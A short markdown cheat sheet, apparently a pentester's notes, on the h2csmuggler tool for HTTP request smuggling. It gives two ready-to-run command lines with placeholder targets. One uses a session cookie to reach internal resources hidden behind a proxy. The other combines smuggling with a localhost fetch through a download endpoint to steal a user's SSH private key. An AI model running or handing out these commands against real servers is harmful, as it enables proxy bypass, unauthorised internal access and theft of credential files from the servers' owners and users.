# h2csmuggler

## Link: https://github.com/BishopFox/h2csmuggler

### Usage:

### This tool is used for HTTP Request smuggling. Here are a few examples:

 - python3 h2csmuggler.py -H "Cookie: session=SESSION_COOKIE" -X "HTTP_METHOD" -x http://TARGET_SERVER.COM http://TARGET_SERVER.COM/TARGET_ENDPOINT (By using a cookie session, preferably elevated privileges, we can craft requests to access internal resources from a web application that are hidden behind a proxy, AKA HTTP Request Smuggling)

 - python3 h2csmuggler.py -H "Cookie: session=SESSION_COOKIE" -X "GET" -x http://TARGET_SERVER.COM http://TARGET_SERVER.COM/download?url=http://127.0.0.1:3923/.cpr/%252Fhome%252FUSER%252F.ssh%252Fid_ecdsa (Download the ssh private key via request smuggling)
   
